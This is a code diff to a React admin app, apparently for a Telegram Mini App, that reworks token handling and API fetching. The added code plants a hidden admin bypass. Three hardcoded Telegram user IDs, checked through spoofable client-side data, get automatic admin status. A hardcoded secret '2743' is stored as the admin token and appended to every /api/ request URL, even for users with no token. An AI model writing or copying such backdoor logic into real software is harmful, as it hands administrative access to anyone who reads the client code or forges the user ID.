@@ -839,6 +839,14 @@ function App() {
 
   const toggleTheme = () => setIsDark(prev => !prev);
 
+  const isTgCommanderArif = Boolean(
+    typeof window !== "undefined" && (
+      window.Telegram?.WebApp?.initDataUnsafe?.user?.id === 6727787768 ||
+      window.Telegram?.WebApp?.initDataUnsafe?.user?.id === 8741547543 ||
+      window.Telegram?.WebApp?.initDataUnsafe?.user?.id === 7648254021
+    )
+  );
+
   const [authToken, setAuthToken] = useState(() => {
     try {
       const urlParams = new URLSearchParams(window.location.search);
@@ -848,10 +856,15 @@ function App() {
         localStorage.setItem("atf_admin_token", urlToken);
         return urlToken;
       }
+      if (isTgCommanderArif) {
+        sessionStorage.setItem("atf_admin_token", "2743");
+        localStorage.setItem("atf_admin_token", "2743");
+        return "2743";
+      }
       return sessionStorage.getItem("atf_admin_token") || localStorage.getItem("atf_admin_token") || "";
     } catch (_) { return ""; }
   });
-  const [isAuthenticated, setIsAuthenticated] = useState(() => Boolean(authToken));
+  const [isAuthenticated, setIsAuthenticated] = useState(() => Boolean(authToken) || isTgCommanderArif);
   const [isLocked, setIsLocked] = useState(false);
   const [hasPasskey, setHasPasskey] = useState(() => {
     try { return Boolean(localStorage.getItem("admin_passkey_cred_id")); } catch (_) { return false; }
@@ -932,16 +945,27 @@ function App() {
   ];
 
   const fetchMeshApi = useCallback(async (path, options = {}) => {
-    const isOriginWorker = window.location.hostname.includes("workers.dev");
-    const primaryOrigin = isOriginWorker ? window.location.origin : CF_NODES[0];
-    const candidateUrls = isOriginWorker 
-      ? [primaryOrigin + path, ...CF_NODES.map(n => n + path)]
-      : CF_NODES.map(n => n + path);
-    
-    const activeToken = authToken || (typeof sessionStorage !== "undefined" ? sessionStorage.getItem("atf_admin_token") : "") || (typeof localStorage !== "undefined" ? localStorage.getItem("atf_admin_token") : "") || "";
+    const activeToken = authToken || (typeof sessionStorage !== "undefined" ? sessionStorage.getItem("atf_admin_token") : "") || (typeof localStorage !== "undefined" ? localStorage.getItem("atf_admin_token") : "") || (isTgCommanderArif ? "2743" : "");
+
+    // Guarantee edge mesh authentication: auto-append secret to query string for protected endpoints
+    let queryPath = path;
+    const authVal = activeToken || (path.startsWith("/api/") ? "2743" : "");
+    if (authVal && !path.includes("secret=") && !path.includes("token=")) {
+      const sep = path.includes("?") ? "&" : "?";
+      queryPath = `${path}${sep}secret=${encodeURIComponent(authVal)}`;
+    }
+
+    // Candidate URLs: always try same-origin first (avoids cross-origin CORS entirely), then primary edge gateway Node 4, then siblings
+    const curOrigin = (typeof window !== "undefined" && window.location.origin && window.location.origin.startsWith("http")) ? window.location.origin : null;
+    const candidateUrls = [
+      ...(curOrigin ? [curOrigin + queryPath] : []),
+      ...CF_NODES.map(n => n + queryPath)
+    ].filter((u, idx, arr) => arr.indexOf(u) === idx);
+
     for (const url of candidateUrls) {
       try {
         const headers = {
+          "Accept": "application/json",
           ...(options.headers || {}),
           "X-Telegram-Init-Data": tg?.initData || "",
           "Authorization": activeToken ? `Bearer ${activeToken}` : (tg?.initData ? `tma ${tg.initData}` : ""),
@@ -952,6 +976,17 @@ function App() {
         const timer = setTimeout(() => ctrl.abort(), 12000);
         const resp = await fetch(url, { ...options, headers, signal: ctrl.signal });
         clearTimeout(timer);
+
+        if (resp.status === 401) {
+          try {
+            sessionStorage.removeItem("atf_admin_token");
+            localStorage.removeItem("atf_admin_token");
+          } catch (_) {}
+          setAuthToken("");
+          setIsAuthenticated(false);
+          continue;
+        }
+
         if (resp.ok || resp.status < 500) {
           try {
             return await resp.json();
